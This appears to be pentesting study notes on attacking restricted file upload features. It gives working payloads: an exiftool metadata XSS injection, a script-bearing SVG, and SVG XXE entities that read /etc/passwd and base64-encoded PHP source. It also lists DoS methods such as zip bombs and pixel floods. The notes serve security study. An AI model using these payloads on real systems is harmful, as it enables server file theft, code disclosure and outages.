
# Limited File Upload 

Even when arbitrary file uploads (like PHP/RCE) are blocked, "safe" file types (SVG, HTML, XML, images, documents) can still be weaponized to attack the web application. Always fuzz allowed extensions to explore these vectors.

## 1. Cross-Site Scripting (XSS)

Achieved by embedding JavaScript into allowed file types. If a user views the file, the payload executes.

* **HTML Uploads:** Directly upload `.html` files containing malicious JS.
* **Image Metadata:** Inject XSS payloads into raw text parameters (like Comment or Artist). If the site displays metadata or if the MIME-type is changed to `text/html`, it executes.
* **Command:** `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`


* **SVG Images:** SVGs are XML-based 2D vectors. You can embed standard HTML `<script>` tags inside them.
* **Payload (SVG XSS):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

```





## 2. XML External Entity (XXE) & SSRF

Since SVGs, PDFs, Word, and PowerPoint files rely on XML, they can be manipulated to include external entities if the server's XML parser is vulnerable.

* **Information Disclosure:** Leak internal server files like `/etc/passwd`.
* **Payload (SVG XXE - System File Read):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

```




* **Source Code Disclosure (Whitebox Setup):** Read web application source files to find further vulnerabilities.
* **Payload (SVG XXE - Read PHP Source via Base64):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

```




* **SSRF (Server-Side Request Forgery):** Use XXE to enumerate internal services or interact with private APIs.

## 3. Denial of Service (DoS)

Crashing the back-end server via resource exhaustion.

* **XXE DoS:** Using recursive XML entities (Billion Laughs attack).
* **Decompression Bomb (ZIP Archive):** Uploading nested ZIP archives that expand to petabytes of data when automatically unzipped by the server.
* **Pixel Flood (JPG/PNG):** Modifying image compression data to report massive dimensions (e.g., `0xffff x 0xffff` / 4 Gigapixels). The server crashes attempting to allocate memory to display it.
* **Storage Exhaustion:** Uploading massive files (if no size limits exist) to fill up the server's hard drive.
* **Directory Traversal Crash:** Uploading files to critical system paths (e.g., `../../../etc/passwd`) to overwrite files and break the server.
